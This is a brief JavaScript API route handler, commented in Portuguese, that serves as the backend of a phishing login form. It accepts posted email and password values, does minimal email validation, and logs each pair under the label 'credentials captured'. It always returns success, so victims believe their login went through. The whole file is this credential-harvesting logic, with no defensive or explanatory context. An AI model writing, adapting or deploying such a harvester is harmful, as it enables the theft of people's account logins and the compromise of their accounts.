export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Método não permitido' });
  }

  try {
    const { email, password } = req.body;
    
    // Validação de email
    if (!email || !email.includes('@')) {
      return res.status(400).json({ error: 'Email inválido' });
    }
    
    // Armazena credenciais
    console.log(`Credenciais capturadas: ${email}:${password}`);
    
    // Resposta positiva
    return res.status(200).json({ success: true });
  } catch (error) {
    console.error('Erro ao capturar credenciais:', error);
    return res.status(500).json({ error: 'Erro interno do servidor' });
  }
}